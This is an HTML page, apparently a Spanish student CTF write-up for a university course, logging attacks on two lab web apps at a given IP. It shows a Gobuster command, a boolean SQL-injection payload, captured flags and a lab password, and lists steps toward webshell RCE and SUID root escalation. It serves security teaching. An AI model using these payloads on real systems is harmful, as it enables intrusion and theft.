<!DOCTYPE html>
<html lang="es" class="scroll-smooth">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>HackLog // Offensive Security & Red Team Field Notes</title>
  
  <!-- Favicon & Fonts -->
  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%232563eb'><path d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z'/></svg>"/>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;500;600;700;800&family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet"/>
  
  <!-- Tailwind CSS CDN -->
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      darkMode: 'class',
      theme: {
        extend: {
          colors: {
            brand: {
              50: '#eff6ff',
              100: '#dbeafe',
              500: '#3b82f6',
              600: '#2563eb',
              700: '#1d4ed8',
              800: '#1e40af',
              900: '#1e3a8a',
            },
            surface: {
              canvas: 'var(--bg-canvas)',
              card: 'var(--bg-card)',
              inset: 'var(--bg-inset)',
              border: 'var(--border-color)',
              text: 'var(--text-main)',
              muted: 'var(--text-muted)'
            }
          },
          fontFamily: {
            sans: ['Geist', 'sans-serif'],
            mono: ['"JetBrains Mono"', 'monospace'],
          }
        }
      }
    }
  </script>

  <style>
    :root {
      --bg-canvas: #f8fafc;
      --bg-card: #ffffff;
      --bg-inset: #f1f5f9;
      --border-color: #e2e8f0;
      --text-main: #0f172a;
      --text-muted: #64748b;
    }
    .dark {
      --bg-canvas: #090d16;
      --bg-card: #0f172a;
      --bg-inset: #1e293b;
      --border-color: #1e293b;
      --text-main: #f8fafc;
      --text-muted: #94a3b8;
    }
    
    ::-webkit-scrollbar {
      width: 6px;
      height: 6px;
    }
    ::-webkit-scrollbar-track {
      background: transparent;
    }
    ::-webkit-scrollbar-thumb {
      background: #cbd5e1;
      border-radius: 9999px;
    }
    .dark ::-webkit-scrollbar-thumb {
      background: #334155;
    }
    
    .img-zoom {
      transition: transform 0.2s ease, box-shadow 0.2s ease;
      cursor: zoom-in;
    }
    .img-zoom:hover {
      transform: scale(1.015);
      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.1);
    }
  </style>
</head>

<body class="bg-surface-canvas text-surface-text font-sans antialiased selection:bg-brand-600 selection:text-white transition-colors duration-200">

  <!-- ================= TOP HEADER NAVIGATION ================= -->
  <header class="fixed top-0 left-0 right-0 h-16 bg-surface-card/90 backdrop-blur-md border-b border-surface-border z-50 flex items-center justify-between px-4 lg:px-8">
    <!-- Brand / Logo -->
    <div class="flex items-center gap-3">
      <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-rose-600 via-brand-600 to-indigo-600 flex items-center justify-center text-white shadow-md shadow-brand-500/20">
        <span class="material-symbols-outlined text-[24px]">terminal</span>
      </div>
      <div class="flex flex-col">
        <div class="flex items-center gap-2">
          <span class="font-extrabold text-xl tracking-tight text-surface-text">Hack<span class="text-brand-600 dark:text-brand-400">Log</span></span>
          <span class="text-[10px] font-mono font-bold px-2 py-0.5 rounded-full bg-brand-50 text-brand-700 dark:bg-brand-950 dark:text-brand-300 border border-brand-200 dark:border-brand-800">v2.0 OPS</span>
        </div>
        <span class="text-xs text-surface-muted hidden sm:inline-block font-mono">Offensive Security & Red Team Field Notes</span>
      </div>
    </div>

    <!-- Quick search trigger -->
    <div class="hidden md:flex items-center flex-1 max-w-md mx-8">
      <div class="relative w-full">
        <span class="material-symbols-outlined absolute left-3 top-2.5 text-surface-muted text-[18px]">search</span>
        <input 
          id="global-search" 
          type="text" 
          placeholder="Buscar comandos, vulnerabilidades o flags (Ctrl+K)..." 
          class="w-full pl-9 pr-12 py-1.5 rounded-lg bg-surface-inset text-surface-text placeholder:text-surface-muted text-sm border border-surface-border focus:outline-none focus:border-brand-500 focus:ring-1 focus:ring-brand-500 transition-all"
        />
        <kbd class="absolute right-2.5 top-2 px-1.5 py-0.5 text-[10px] font-mono rounded bg-surface-card text-surface-muted border border-surface-border shadow-xs">⌘K</kbd>
      </div>
    </div>

    <!-- Right Controls: Atmospheric Status -->
    <div class="flex items-center gap-3">
      <!-- Target status telemetry badge -->
      <div class="hidden lg:flex items-center gap-2.5 px-3.5 py-1.5 rounded-full bg-rose-500/10 text-rose-600 dark:text-rose-400 border border-rose-500/20 text-xs font-mono font-semibold">
        <span class="w-2 h-2 rounded-full bg-rose-500 animate-ping"></span>
        <span class="tracking-wide">ENGAGEMENT ACTIVE</span>
        <span class="text-surface-muted">|</span>
        <span class="text-surface-text font-bold">134.209.63.29</span>
      </div>

      <!-- Theme Switcher -->
      <button id="theme-toggle" class="p-2 rounded-lg bg-surface-inset text-surface-muted hover:text-surface-text transition-colors" title="Alternar modo claro / oscuro">
        <span id="theme-icon" class="material-symbols-outlined text-[20px]">dark_mode</span>
      </button>

      <!-- GitHub Repo Link -->
      <a href="https://github.com/TheWiche/HackLog" target="_blank" rel="noopener" class="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-surface-inset hover:bg-surface-border text-surface-text text-sm font-medium transition-all" title="Ver repositorio en GitHub">
        <svg class="w-4 h-4 fill-current" viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
        <span class="hidden sm:inline">Repo</span>
      </a>
    </div>
  </header>

  <!-- ================= MAIN CONTAINER ================= -->
  <div class="pt-16 flex min-h-screen">
    
    <!-- ================= LEFT SIDEBAR (STICKY NAVIGATION) ================= -->
    <aside class="w-72 fixed top-16 bottom-0 left-0 bg-surface-card border-r border-surface-border overflow-y-auto px-4 py-6 hidden lg:block z-30">
      <div class="mb-4">
        <div class="flex items-center justify-between pb-3 border-b border-surface-border">
          <span class="text-xs font-mono font-bold uppercase tracking-wider text-surface-muted">Módulos & Auditorías</span>
          <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-surface-inset text-brand-600 font-bold">2026-II</span>
        </div>
      </div>

      <nav class="space-y-6 text-sm">
        <!-- SECCIÓN ACTIVA: CORTE 1 -->
        <div class="p-3 rounded-xl bg-surface-inset border border-surface-border/80">
          <div class="flex items-center justify-between mb-2">
            <span class="text-xs font-bold uppercase tracking-wider text-brand-600 dark:text-brand-400 font-mono flex items-center gap-1.5">
              <span class="material-symbols-outlined text-[14px]">folder_open</span>
              <span>Corte 1: CTF Web & SUID</span>
            </span>
            <span class="w-2 h-2 rounded-full bg-emerald-500" title="Módulo Activo y Completado"></span>
          </div>
          
          <ul class="space-y-1 pl-1">
            <li><a href="#fundamentos" class="nav-link flex items-center gap-2 px-2 py-1 rounded-md text-xs text-surface-muted hover:text-surface-text hover:bg-surface-card transition-colors"><span>00. Fundamentos OWASP & HTTP</span></a></li>
            <li><a href="#s1-fase1" class="nav-link flex items-center gap-2 px-2 py-1 rounded-md text-xs text-surface-muted hover:text-surface-text hover:bg-surface-card transition-colors"><span>01. S1: Reconocimiento Gobuster</span></a></li>
            <li><a href="#s1-fase2" class="nav-link flex items-center gap-2 px-2 py-1 rounded-md text-xs text-surface-muted hover:text-surface-text hover:bg-surface-card transition-colors"><span>02. S1: Detección SQLi Booleano</span></a></li>
            <li><a href="#s1-fase3" class="nav-link flex items-center gap-2 px-2 py-1 rounded-md text-xs text-surface-muted hover:text-surface-text hover:bg-surface-card transition-colors"><span>03. S1: Exfiltración UNION SQLi</span></a></li>
            <li><a href="#s1-fase4" class="nav-link flex items-center gap-2 px-2 py-1 rounded-md text-xs text-surface-muted hover:text-surface-text hover:bg-surface-card transition-colors"><span>04. S1: Cracking MD5 (John)</span></a></li>
            <li><a href="#s1-fase5" class="nav-link flex items-center gap-2 px-2 py-1 rounded-md text-xs text-surface-muted hover:text-surface-text hover:bg-surface-card transition-colors"><span>05. S1: File Upload (MIME Bypass)</span></a></li>
            <li><a href="#s1-fase6" class="nav-link flex items-center gap-2 px-2 py-1 rounded-md text-xs text-surface-muted hover:text-surface-text hover:bg-surface-card transition-colors"><span>06. S1: RCE & FLAG 1</span></a></li>
            <li><a href="#s1-fase7" class="nav-link flex items-center gap-2 px-2 py-1 rounded-md text-xs text-surface-muted hover:text-surface-text hover:bg-surface-card transition-colors"><span>07. S1: SUID & PATH Hijack (FLAG 2)</span></a></li>
            <li><a href="#s2-fase8" class="nav-link flex items-center gap-2 px-2 py-1 rounded-md text-xs text-surface-muted hover:text-surface-text hover:bg-surface-card transition-colors"><span>08. S2: Info Disclosure (phpinfo)</span></a></li>
            <li><a href="#s2-fase9" class="nav-link flex items-center gap-2 px-2 py-1 rounded-md text-xs text-surface-muted hover:text-surface-text hover:bg-surface-card transition-colors"><span>09. S2: Fuerza Bruta (Hydra)</span></a></li>
            <li><a href="#s2-fase10" class="nav-link flex items-center gap-2 px-2 py-1 rounded-md text-xs text-surface-muted hover:text-surface-text hover:bg-surface-card transition-colors"><span>10. S2: IDOR en Reportes</span></a></li>
            <li><a href="#s2-fase11" class="nav-link flex items-center gap-2 px-2 py-1 rounded-md text-xs text-surface-muted hover:text-surface-text hover:bg-surface-card transition-colors"><span>11. S2: Exfiltración FLAG Sitio 2</span></a></li>
            <li><a href="#s2-fase12" class="nav-link flex items-center gap-2 px-2 py-1 rounded-md text-xs text-surface-muted hover:text-surface-text hover:bg-surface-card transition-colors"><span>12. S2: HTTP PUT Upload (Burp)</span></a></li>
            <li><a href="#s2-fase13" class="nav-link flex items-center gap-2 px-2 py-1 rounded-md text-xs text-surface-muted hover:text-surface-text hover:bg-surface-card transition-colors"><span>13. S2: RCE & Docker Env Vars</span></a></li>
          </ul>
        </div>

        <!-- MÓDULOS MODULARES PARA FUTUROS LABORATORIOS -->
        <div class="space-y-3">
          <span class="text-xs font-bold uppercase tracking-wider text-surface-muted font-mono block px-1">Próximos Laboratorios</span>
          
          <!-- Slot Corte 2 -->
          <div class="p-3 rounded-xl bg-surface-card border border-surface-border/60 opacity-75 hover:opacity-100 transition-opacity">
            <div class="flex items-center justify-between mb-1">
              <span class="text-xs font-bold text-surface-text font-mono flex items-center gap-1.5">
                <span class="material-symbols-outlined text-[14px] text-amber-500">lan</span>
                <span>Corte 2: Redes & Active Directory</span>
              </span>
              <span class="text-[9px] font-mono px-1.5 py-0.5 rounded bg-amber-50 text-amber-600 dark:bg-amber-950 dark:text-amber-400 font-bold">Próximo</span>
            </div>
            <p class="text-[11px] text-surface-muted">Pivoting, Kerberoasting, BloodHound y evaluación de dominios internos.</p>
          </div>

          <!-- Slot Corte 3 -->
          <div class="p-3 rounded-xl bg-surface-card border border-surface-border/60 opacity-75 hover:opacity-100 transition-opacity">
            <div class="flex items-center justify-between mb-1">
              <span class="text-xs font-bold text-surface-text font-mono flex items-center gap-1.5">
                <span class="material-symbols-outlined text-[14px] text-purple-500">memory</span>
                <span>Corte 3: Buffer Overflow & Binarios</span>
              </span>
              <span class="text-[9px] font-mono px-1.5 py-0.5 rounded bg-purple-50 text-purple-600 dark:bg-purple-950 dark:text-purple-400 font-bold">Próximo</span>
            </div>
            <p class="text-[11px] text-surface-muted">Ingeniería inversa, ROP chains, bypass de protecciones y shellcoding.</p>
          </div>
        </div>

        <!-- SECCIÓN NORMAS & PLAYBOOK -->
        <div>
          <span class="text-xs font-bold uppercase tracking-wider text-surface-muted font-mono block mb-2 px-1">Recursos Generales</span>
          <ul class="space-y-1">
            <li><a href="#matriz-owasp" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">grid_view</span><span>14. Tabla Comparativa OWASP</span></a></li>
            <li><a href="#marco-legal" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">gavel</span><span>15. Marco Legal & Ley 1273</span></a></li>
            <li><a href="#cheatsheet" class="nav-link flex items-center gap-2 px-2.5 py-1.5 rounded-lg text-surface-muted hover:text-surface-text hover:bg-surface-inset transition-colors"><span class="material-symbols-outlined text-[16px]">terminal</span><span>Playbook Rápido CLI</span></a></li>
          </ul>
        </div>
      </nav>
    </aside>

    <!-- ================= MAIN CONTENT AREA ================= -->
    <main class="flex-1 lg:pl-72 max-w-full">
      <div class="max-w-5xl mx-auto px-4 sm:px-8 py-10 space-y-16">
        
        <!-- HERO BANNER -->
        <section class="relative overflow-hidden rounded-2xl bg-gradient-to-br from-slate-950 via-slate-900 to-brand-950 text-white p-8 sm:p-10 shadow-2xl border border-slate-800">
          <div class="relative z-10 max-w-3xl space-y-4">
            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-rose-500/20 backdrop-blur-md text-rose-300 text-xs font-mono font-semibold border border-rose-500/30">
              <span class="w-1.5 h-1.5 rounded-full bg-rose-400 animate-pulse"></span>
              <span>HACKLOG SECURITY AUDIT · CORTE 1 OFICIAL</span>
            </div>
            <h1 class="text-3xl sm:text-4xl font-extrabold tracking-tight">
              CTF: Reconocimiento, Explotación & Análisis Forense de Vulnerabilidades
            </h1>
            <p class="text-slate-300 text-base sm:text-lg leading-relaxed font-normal">
              Bitácora de seguridad ofensiva desarrollada para la evaluación técnica sobre los entornos <strong>TechNova Store</strong> (Puerto 80) y <strong>Larm182 Solutions</strong> (Puerto 8080). Análisis exhaustivo de vectores OWASP Top 10, ejecución de código y remediaciones en código.
            </p>
            
            <!-- Auditores / Integrantes del grupo -->
            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-3">
              <div class="p-3 rounded-xl bg-white/5 border border-white/10 flex items-center gap-3">
                <div class="w-8 h-8 rounded-lg bg-brand-500/20 text-brand-400 flex items-center justify-center shrink-0">
                  <span class="material-symbols-outlined text-[18px]">badge</span>
                </div>
                <div class="flex flex-col">
                  <span class="text-xs font-bold text-white">Nelson Wilinton Cotes Yepez</span>
                  <span class="text-[11px] font-mono text-slate-400">Código: 0182210015 · Auditor Líder</span>
                </div>
              </div>

              <div class="p-3 rounded-xl bg-white/5 border border-white/10 flex items-center gap-3">
                <div class="w-8 h-8 rounded-lg bg-indigo-500/20 text-indigo-400 flex items-center justify-center shrink-0">
                  <span class="material-symbols-outlined text-[18px]">badge</span>
                </div>
                <div class="flex flex-col">
                  <span class="text-xs font-bold text-white">Carlos Andrés Martínez Jáuregui</span>
                  <span class="text-[11px] font-mono text-slate-400">Código: 0002620001 · Auditor Co-investigador</span>
                </div>
              </div>
            </div>

            <div class="flex items-center gap-2 pt-2 text-xs font-mono text-slate-400">
              <span class="material-symbols-outlined text-[15px]">school</span>
              <span>Docente Evaluador: <strong>Luis Ángel Ramírez Mendoza</strong> · Universidad de La Guajira (2026-II)</span>
            </div>
          </div>
          <!-- Decorative subtle grid -->
          <div class="absolute inset-0 bg-[radial-gradient(#ffffff_1px,transparent_1px)] [background-size:16px_16px] opacity-10 pointer-events-none"></div>
        </section>

        <!-- FLAGS SUMMARY CARD (INTERACTIVE) -->
        <section class="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div class="p-5 rounded-xl bg-surface-card border border-surface-border shadow-xs flex flex-col justify-between">
            <div>
              <div class="flex items-center justify-between text-xs font-mono text-surface-muted mb-2">
                <span>FLAG 1 (Sitio 1 - RCE)</span>
                <span class="px-2 py-0.5 rounded bg-emerald-50 text-emerald-600 dark:bg-emerald-950 dark:text-emerald-400 font-bold">Capturada</span>
              </div>
              <div class="font-mono text-sm font-bold text-surface-text truncate select-all" title="FLAG{6e2c3a325feda8c8283908fba329969}">
                FLAG{6e2c3a325feda8c8283908fba329969}
              </div>
            </div>
            <span class="text-xs text-surface-muted mt-3">Ruta: /var/www/technova/flag1.txt</span>
          </div>

          <div class="p-5 rounded-xl bg-surface-card border border-surface-border shadow-xs flex flex-col justify-between">
            <div>
              <div class="flex items-center justify-between text-xs font-mono text-surface-muted mb-2">
                <span>FLAG 2 (Sitio 1 - Root SUID)</span>
                <span class="px-2 py-0.5 rounded bg-emerald-50 text-emerald-600 dark:bg-emerald-950 dark:text-emerald-400 font-bold">Capturada</span>
              </div>
              <div class="font-mono text-sm font-bold text-surface-text truncate select-all" title="FLAG{53dbcc8c5acc828c0ae1e085e575f25d}">
                FLAG{53dbcc8c5acc828c0ae1e085e575f25d}
              </div>
            </div>
            <span class="text-xs text-surface-muted mt-3">Ruta: /var/www/technova/.private/flag2.txt</span>
          </div>

          <div class="p-5 rounded-xl bg-surface-card border border-surface-border shadow-xs flex flex-col justify-between">
            <div>
              <div class="flex items-center justify-between text-xs font-mono text-surface-muted mb-2">
                <span>FLAG Sitio 2 (IDOR Creds)</span>
                <span class="px-2 py-0.5 rounded bg-emerald-50 text-emerald-600 dark:bg-emerald-950 dark:text-emerald-400 font-bold">Capturada</span>
              </div>
              <div class="font-mono text-sm font-bold text-surface-text truncate select-all" title="C0rp0r4t3_B4ckup_2026">
                C0rp0r4t3_B4ckup_2026
              </div>
            </div>
            <span class="text-xs text-surface-muted mt-3">Usuario: hacking_etico2026</span>
          </div>
        </section>

        <!-- ================= SECTION 00: FUNDAMENTOS ================= -->
        <section id="fundamentos" class="space-y-6 pt-6">
          <div class="flex items-center gap-3 border-b border-surface-border pb-3">
            <span class="flex items-center justify-center w-8 h-8 rounded-lg bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono font-bold text-sm">00</span>
            <h2 class="text-2xl font-bold tracking-tight">Fundamentos Teóricos & Metodología</h2>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-6 text-sm text-surface-muted leading-relaxed">
            <div class="p-5 rounded-xl bg-surface-card border border-surface-border space-y-3">
              <h3 class="font-bold text-surface-text text-base flex items-center gap-2">
                <span class="material-symbols-outlined text-brand-600">shield</span>
                ¿Qué es OWASP y el Top 10?
              </h3>
              <p>
                <strong>OWASP (Open Worldwide Application Security Project)</strong> es una comunidad global sin ánimo de lucro orientada a elevar los estándares de seguridad en aplicaciones web. Su proyecto insignia, el <strong>OWASP Top 10</strong>, categoriza los 10 riesgos más críticos para desarrolladores, auditores y arquitectos de software.
              </p>
              <ul class="list-disc pl-5 space-y-1 text-xs">
                <li><strong class="text-surface-text">A01: Broken Access Control</strong> — Fallos de autorización y referencias IDOR.</li>
                <li><strong class="text-surface-text">A02: Cryptographic Failures</strong> — Criptografía débil (MD5 sin sal, texto plano).</li>
                <li><strong class="text-surface-text">A03: Injection</strong> — SQLi, Command Injection y paso de datos no confiables.</li>
                <li><strong class="text-surface-text">A04: Insecure Design</strong> — Fallas inherentes de arquitectura y lógica de negocio.</li>
                <li><strong class="text-surface-text">A05: Security Misconfiguration</strong> — Diagnósticos (phpinfo) y valores por defecto.</li>
                <li><strong class="text-surface-text">A07: Identification & Auth Failures</strong> — Fuerza bruta y debilidad en credenciales.</li>
              </ul>
            </div>

            <div class="p-5 rounded-xl bg-surface-card border border-surface-border space-y-3">
              <h3 class="font-bold text-surface-text text-base flex items-center gap-2">
                <span class="material-symbols-outlined text-brand-600">http</span>
                Protocolo HTTP & Vectores de Ataque
              </h3>
              <p>
                La comunicación entre cliente y servidor se rige por el protocolo HTTP. La superficie de ataque de una aplicación reside en cómo procesa los métodos, cabeceras y parámetros recibidos:
              </p>
              <div class="space-y-2 text-xs">
                <div class="p-2.5 rounded-lg bg-surface-inset border border-surface-border">
                  <span class="font-mono font-bold text-brand-600">GET vs POST vs PUT</span>: GET solicita datos en la URL (?q=); POST envía cuerpos estructurados; PUT transfiere recursos directamente al servidor.
                </div>
                <div class="p-2.5 rounded-lg bg-surface-inset border border-surface-border">
                  <span class="font-mono font-bold text-brand-600">Content-Type & Headers</span>: Cabeceras manipulables por el cliente que pueden eludir validaciones ingenuas de tipo MIME.
                </div>
                <div class="p-2.5 rounded-lg bg-surface-inset border border-surface-border">
                  <span class="font-mono font-bold text-brand-600">Códigos de Estado</span>: 200 (Éxito), 302 (Redirección), 401 (No autenticado), 403 (Prohibido), 404 (No existe).
                </div>
              </div>
            </div>
          </div>

          <!-- Metodología de Cadena de Ataque -->
          <div id="metodologia" class="p-6 rounded-xl bg-surface-inset border border-surface-border space-y-4">
            <h3 class="font-bold text-surface-text text-base flex items-center gap-2">
              <span class="material-symbols-outlined text-brand-600">hub</span>
              Cadena de Compromiso Total: De Visitante Anónimo a Superusuario Root
            </h3>
            <div class="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 gap-2 text-center text-xs font-mono">
              <div class="p-3 rounded-lg bg-surface-card border border-surface-border flex flex-col justify-center">
                <span class="text-brand-600 font-bold mb-1">1. Recon</span>
                <span class="text-surface-muted text-[11px]">Gobuster en /search</span>
              </div>
              <div class="p-3 rounded-lg bg-surface-card border border-surface-border flex flex-col justify-center">
                <span class="text-brand-600 font-bold mb-1">2. SQLi</span>
                <span class="text-surface-muted text-[11px]">' OR '1'='1</span>
              </div>
              <div class="p-3 rounded-lg bg-surface-card border border-surface-border flex flex-col justify-center">
                <span class="text-brand-600 font-bold mb-1">3. Exfil</span>
                <span class="text-surface-muted text-[11px]">UNION SELECT</span>
              </div>
              <div class="p-3 rounded-lg bg-surface-card border border-surface-border flex flex-col justify-center">
                <span class="text-brand-600 font-bold mb-1">4. Cracking</span>
                <span class="text-surface-muted text-[11px]">John: MD5</span>
              </div>
              <div class="p-3 rounded-lg bg-surface-card border border-surface-border flex flex-col justify-center">
                <span class="text-brand-600 font-bold mb-1">5. Bypass</span>
                <span class="text-surface-muted text-[11px]">MIME: PDF</span>
              </div>
              <div class="p-3 rounded-lg bg-surface-card border border-surface-border flex flex-col justify-center">
                <span class="text-brand-600 font-bold mb-1">6. RCE</span>
                <span class="text-surface-muted text-[11px]">Webshell www-data</span>
              </div>
              <div class="p-3 rounded-lg bg-surface-card border border-surface-border flex flex-col justify-center">
                <span class="text-brand-600 font-bold mb-1">7. SUID</span>
                <span class="text-surface-muted text-[11px]">netdiag en /usr</span>
              </div>
              <div class="p-3 rounded-lg bg-emerald-50 dark:bg-emerald-950/40 border border-emerald-300 dark:border-emerald-800 text-emerald-700 dark:text-emerald-400 font-bold flex flex-col justify-center">
                <span class="mb-1">8. ROOT</span>
                <span class="text-[11px]">PATH Hijack</span>
              </div>
            </div>
          </div>
        </section>

        <!-- ================= SECTION 01: TECHNOVA STORE ================= -->
        <section class="space-y-10 pt-4">
          <div class="flex items-center justify-between border-b border-rose-200 dark:border-rose-900 pb-3">
            <div class="flex items-center gap-3">
              <span class="flex items-center justify-center w-8 h-8 rounded-lg bg-rose-50 text-rose-600 dark:bg-rose-950 dark:text-rose-400 font-mono font-bold text-sm">01</span>
              <div>
                <h2 class="text-2xl font-bold tracking-tight text-surface-text">Sitio 1 — TechNova Store</h2>
                <span class="text-xs text-surface-muted font-mono">http://134.209.63.29:80 · SQLi, Cracking, Webshell & Escalada</span>
              </div>
            </div>
            <span class="px-3 py-1 rounded-full text-xs font-mono font-bold bg-rose-50 text-rose-700 dark:bg-rose-950 dark:text-rose-300 border border-rose-200 dark:border-rose-800">35 Puntos (Preguntas 1–7)</span>
          </div>

          <!-- FASE 1: RECONOCIMIENTO -->
          <article id="s1-fase1" class="space-y-4 p-6 rounded-2xl bg-surface-card border border-surface-border shadow-xs">
            <div class="flex flex-wrap items-center justify-between gap-2 border-b border-surface-border pb-3">
              <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono text-xs font-bold">Fase 1</span>
                <h3 class="text-lg font-bold text-surface-text">Pregunta 1 — Reconocimiento y Enumeración con Gobuster</h3>
              </div>
              <span class="text-xs font-mono text-surface-muted font-semibold">Valor: 5 pts</span>
            </div>

            <p class="text-sm text-surface-muted leading-relaxed">
              La fase de reconocimiento inicial busca identificar recursos ocultos o rutas críticas que no se encuentran enlazadas directamente en el menú de navegación de la tienda.
            </p>

            <!-- Code Command Box -->
            <div class="rounded-xl overflow-hidden bg-slate-900 text-slate-100 font-mono text-xs border border-slate-800">
              <div class="flex items-center justify-between px-4 py-2 bg-slate-800/80 border-b border-slate-700/60">
                <span class="text-slate-400 font-bold">BASH · GOBUSTER CLI</span>
                <button onclick="copyCode(this)" class="flex items-center gap-1 text-slate-400 hover:text-white transition-colors">
                  <span class="material-symbols-outlined text-[14px]">content_copy</span>
                  <span>Copiar</span>
                </button>
              </div>
              <pre class="p-4 overflow-x-auto text-[13px] leading-relaxed"><code>gobuster dir -u http://134.209.63.29/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30</code></pre>
            </div>

            <!-- Evidence Images Grid -->
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
              <div class="space-y-1.5">
                <img src="assets/images/s1_recon_gobuster_1.png" alt="Gobuster escaneo inicial" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Gobuster: Descubrimiento inicial de rutas críticas')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 1.1: Descubrimiento de /admin, /login, /cart y /catalog</p>
              </div>
              <div class="space-y-1.5">
                <img src="assets/images/s1_recon_gobuster_2.jpg" alt="Gobuster escaneo final" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Gobuster: Conclusión de escaneo de directorios')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 1.2: Detección de /profile, /register y /search</p>
              </div>
            </div>

            <!-- Analysis Box -->
            <div class="p-4 rounded-xl bg-surface-inset border border-surface-border space-y-2 text-xs">
              <span class="font-bold text-surface-text uppercase font-mono tracking-wider">Superficie de Ataque Identificada:</span>
              <p class="text-surface-muted leading-relaxed">
                Las rutas <code class="px-1 py-0.5 rounded bg-surface-card text-brand-600 font-bold">/search</code> y <code class="px-1 py-0.5 rounded bg-surface-card text-brand-600 font-bold">/admin</code> representan los vectores prioritarios. El endpoint de búsqueda acepta parámetros GET públicos no sanitizados, convirtiéndose en el blanco ideal para pruebas de inyección. Por su parte, el panel administrativo ofrece el vector de escalada tras comprometer las credenciales.
              </p>
            </div>
          </article>

          <!-- FASE 2: SQLI BOOLEANO -->
          <article id="s1-fase2" class="space-y-4 p-6 rounded-2xl bg-surface-card border border-surface-border shadow-xs">
            <div class="flex flex-wrap items-center justify-between gap-2 border-b border-surface-border pb-3">
              <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono text-xs font-bold">Fase 2</span>
                <h3 class="text-lg font-bold text-surface-text">Pregunta 2 — Detección & Confirmación de SQL Injection (OWASP A03)</h3>
              </div>
              <span class="text-xs font-mono text-surface-muted font-semibold">Valor: 5 pts</span>
            </div>

            <p class="text-sm text-surface-muted leading-relaxed">
              Al analizar el parámetro de búsqueda <code>?q=</code>, se comprobó que el backend realiza una concatenación directa de cadenas dentro de una consulta de tipo <code>LIKE '%INPUT%'</code>. Se envió una condición booleana siempre verdadera para observar el comportamiento.
            </p>

            <div class="rounded-xl overflow-hidden bg-slate-900 text-slate-100 font-mono text-xs border border-slate-800">
              <div class="flex items-center justify-between px-4 py-2 bg-slate-800/80 border-b border-slate-700/60">
                <span class="text-slate-400 font-bold">PAYLOAD DE INYECCIÓN SQL</span>
                <button onclick="copyCode(this)" class="flex items-center gap-1 text-slate-400 hover:text-white transition-colors">
                  <span class="material-symbols-outlined text-[14px]">content_copy</span>
                  <span>Copiar</span>
                </button>
              </div>
              <pre class="p-4 overflow-x-auto text-[13px] leading-relaxed"><code>http://134.209.63.29/search?q=' OR '1'='1</code></pre>
            </div>

            <div class="space-y-1.5">
              <img src="assets/images/s1_sqli_boolean_search.png" alt="Confirmación SQLi" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Inyección SQL: El servidor responde con todo el inventario al evaluar condición verdadera')"/>
              <p class="text-[11px] text-surface-muted text-center italic">Evidencia 2.1: Respuesta del servidor Search results for "'' OR '1'='1" listando todos los productos existentes</p>
            </div>

            <div class="p-4 rounded-xl bg-amber-50 dark:bg-amber-950/30 border border-amber-200 dark:border-amber-800 text-amber-900 dark:text-amber-200 text-xs space-y-1.5">
              <div class="flex items-center gap-2 font-bold font-mono">
                <span class="material-symbols-outlined text-[16px]">warning</span>
                <span>Confirmación de Vulnerabilidad CWE-89</span>
              </div>
              <p class="leading-relaxed">
